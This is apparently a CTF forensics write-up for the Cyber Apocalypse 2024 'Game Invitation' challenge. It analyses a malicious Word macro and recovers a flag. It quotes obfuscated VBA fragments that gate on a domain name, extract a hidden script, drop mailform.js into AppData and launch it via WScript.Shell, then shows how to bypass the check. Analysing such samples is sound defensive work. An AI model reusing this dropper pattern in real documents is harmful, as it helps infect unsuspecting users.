---
layout: load_md
title: The White Circle | Cyber Apocalypse 2024 | Game Invitation Writeup
desc: "The White Circle is a community for Cyber/Information Security students, enthusiasts and professionals. You can discuss anything related to Security, share your knowledge with others, get help when you need it and proceed further in your journey with amazing people from all over the world."
image: images/twc_og_banner.jpg
ctf: Cyber Apocalypse 2024
parent: cyber_apocalypse_2024
category: forensics
challenge: Game Invitation
tags: "forensics, twh, macros, malware"
date: 2024-03-16T00:00:00+00:00
last_update: 2024-03-16T00:00:00+00:00
---

<h1 class="heading card-title white-text">Cyber Apocalypse 2024</h1>

## Game Invitation
> Solved by : thewhiteh4t


- Challenge talks about receiving a malicious `docm` file in email
- We managed to solve the challenge using windows and MS Office 2016
- We inspected the `macros` in the document and here is a brief flow : 
    - it checks for host domain and proceeds if it matches
```
chkDomain = "GAMEMASTERS.local"
strUserDomain = Environ$("UserDomain")
If chkDomain <> strUserDomain Then
```
- opens the current document as binary mode 
`Open (ActiveDocument.FullName) For Binary As #gIvqmZwiW`
    - uses regex to match a set pattern
```
    SwMbxtWpP = StrConv(CbkQJVeAG, vbUnicode)
    Dim N34rtRBIU3yJO2cmMVu, I4j833DS5SFd34L3gwYQD
    Dim vTxAnSEFH
        Set vTxAnSEFH = CreateObject("vbscript.regexp")
        vTxAnSEFH.Pattern = "sWcDWp36x5oIe2hJGnRy1iC92AcdQgO8RLioVZWlhCKJXHRSqO450AiqLZyLFeXYilCtorg0p3RdaoPa"
        Set I4j833DS5SFd34L3gwYQD = vTxAnSEFH.Execute(SwMbxtWpP)
```
- gets `AppData` dir path and writes `mailform.js`
```
    kWXlyKwVj = Environ("appdata") & "\Microsoft\Windows"
    Set aMUsvgOin = CreateObject("Scripting.FileSystemObject")
    If Not aMUsvgOin.FolderExists(kWXlyKwVj) Then
    kWXlyKwVj = Environ("appdata")
    End If
    Set aMUsvgOin = Nothing
    Dim K764B5Ph46Vh
    K764B5Ph46Vh = FreeFile
    IAiiymixt = kWXlyKwVj & "\" & "mailform.js"
```
- uses `wscript` to run `mailform.js`
```
    Set R66BpJMgxXBo2h = CreateObject("WScript.Shell")
    R66BpJMgxXBo2h.Run """" + IAiiymixt + """" + " vF8rdgMHKBrvCoCp0ulm"
```

![](https://i.imgur.com/pmMXx2Y.png)

- Finally it runs clean up and deletes `mailform.js`
- First we can modify the domain check to bypass that condition
    ```
    chkDomain = "GAMEMASTERS.local"
    strUserDomain = Environ$("UserDomain") <-- original
    strUserDomain = "GAMEMASTERS.local"    <-- simply replace it with the domain
    If chkDomain <> strUserDomain Then
    ```
- In the `mailform.js` file we can add one extra statement to print the output of the function just before it hits `eval` as highlighted below :


![](https://i.imgur.com/8PPfPGU.png)



- Now we can use `csript` which is a CMD alternative of `wscript` to read the output it will print : 


![](https://i.imgur.com/WasZ239.png)

- In the noise we can see a `cookie`  being sent with a base64 string

```
> echo "SFRCe200bGQwY3NfNHIzX2czdHQxbmdfVHIxY2tpMTNyfQo=" | base64 -d
> HTB{m4ld0cs_4r3_g3tt1ng_Tr1cki13r}
```

